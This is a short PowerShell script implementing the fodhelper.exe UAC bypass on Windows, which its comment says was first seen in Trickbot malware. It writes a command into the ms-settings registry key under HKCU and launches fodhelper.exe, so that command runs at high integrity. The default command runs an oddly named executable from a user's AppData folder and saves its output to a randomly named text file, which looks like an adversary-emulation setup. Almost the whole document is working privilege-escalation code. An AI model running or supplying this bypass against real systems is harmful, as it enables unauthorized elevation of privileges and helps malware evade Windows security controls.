<#
    this script leverages a UAC bypass method originally discovered via a
	Trickbot malware sample.System Settings (fodhelper.exe) spawns as a high integirty process and will
	execute whatever command exists within a HKCU\Software\Classes\ms-settings\shell\open\command 
    Resource: https://www.bleepingcomputer.com/news/security/trickbot-now-uses-a-windows-10-uac-bypass-to-evade-detection/
#>

# Example: .\uac-bypass -exe process-to-run-as-high-integrity (powershell by default)

param (
    $exe="cmd.exe /C C:\Users\kmitnick.FINANCIAL\AppData\Roaming\TransbaseOdbcDriver\smrs.exe > C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\MGsCOxPSNK.txt"    
)

$high_integrity_binary="fodhelper.exe";

# Add registry key that fodhelper.exe executes as a high integrity process.
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Value "$exe" -Force;
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -value "" -Force;

Start-Process $high_integrity_binary;